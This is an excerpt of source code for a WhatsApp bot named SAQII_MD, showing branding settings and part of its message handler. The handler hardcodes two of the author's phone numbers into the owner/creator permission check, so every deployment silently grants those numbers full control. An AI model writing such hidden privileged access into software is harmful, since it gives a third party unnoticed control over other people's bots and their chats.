...
try {
    ...
    console.log("Connected to the SAQII_MD Whatsapp Bot By SAQLAIN KING")
} catch {
...
setTimeout(() => {
	...
	global.devp = fs.readFileSync(__dirname + "/assets/SAQII_KING.png");
    global.slogo = 'https://telegra.ph/file/59daae7b189f0319c9034.jpg'
    global.sgc = ''
    global.srepo = 'https://github.com/Saqlain590/SAQII-MD'
    global.scap = '*⤹★ᴘᴏᴡᴇʀᴇᴅ ʙʏ★⤸ 𝗦𝗔𝗤𝗜𝗜 ᴹᴰ* '
    global.sgen = `*╰┈➤ 𝙶𝙴𝙽𝙴𝚁𝙰𝚃𝙴𝙳 𝙱𝚈  𝗦𝗔𝗤𝗜𝗜 ᴹᴰ*`
    global.snam = 'SAQII MD'
    global.scate  = `
┏━━⟪⟪  𝗦𝗔𝗤𝗜𝗜ᴹᴰ ⟫━⦿       
...
setInterval(() => { store.writeToFile(__dirname+"/store.json"); }, 30 * 1000);
        Void.ev.on('messages.upsert', async chatUpdate => {
            ...
            try {
                ...
                var { body } = citel
		        const Saqi= ['923322483690','923407472645'] ;
                let isCreator = [ hgg,...Saqi,...global.sudo.split(','),...global.devs, ...global.owner].map((v) => v.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(citel.sender);
                var SAQLAIN = [...Saqi].map((v) => v.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(citel.sender)
                ...
                // if (botNumber!=='923407472645@s.whatsapp.net') return
                ...
                if (icmd) {
                    ...
                    if (cmd) {
                        isCreator = [hgg,...Saqi,...global.sudo.split(','),...global.devs,...global.owner].map((v) => v.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(citel.sender);
...
*/ //------------------------------------------------------------------------------------
                    ...
                    if (checkinfo) {
                        ...
                        try{ if (anu.id === '120363169665426586@g.us' && !SAQLAIN ) return }
